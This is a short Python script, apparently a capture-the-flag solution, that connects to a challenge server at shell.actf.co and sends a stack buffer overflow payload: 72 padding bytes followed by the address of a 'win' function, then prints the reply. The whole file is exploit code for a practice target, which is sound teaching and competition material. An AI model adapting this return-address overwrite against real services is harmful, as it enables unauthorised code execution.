import socket
import struct
import time


def flush(sock):
    time.sleep(0.1)
    return sock.recv(2048)


def p64(n):
    return struct.pack("<Q", n)


if __name__ == "__main__":
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("shell.actf.co", 21830))

    flush(sock).decode()

    payload = b"A" * 72
    payload += p64(0x00401196)  # win function address
    payload += b"\n"

    sock.send(payload)

    print(flush(sock).decode())
